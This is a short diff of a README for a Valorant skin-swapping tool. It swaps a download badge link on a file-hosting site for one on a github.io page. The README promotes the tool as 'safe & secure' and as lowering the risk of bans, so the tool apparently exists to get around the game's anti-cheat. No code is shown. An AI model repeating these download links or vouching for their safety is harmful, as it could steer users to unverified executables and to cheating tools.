@@ -9,4 +9,4 @@
 - **Customization:** tailor your in-game appearance with a wide selection of skins and styles.
 - **Safe & Secure:** uses secure methods for skin swapping, minimizing the risk of penalties or bans in *Valorant*.
 
-**[![Download ValorantSkinSwapper](https://img.shields.io/badge/Download-Valorant%20SkinSwapper-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download ValorantSkinSwapper](https://img.shields.io/badge/Download-Valorant%20SkinSwapper-blueviolet)](https://valorantskinswapper.github.io/.github/)**
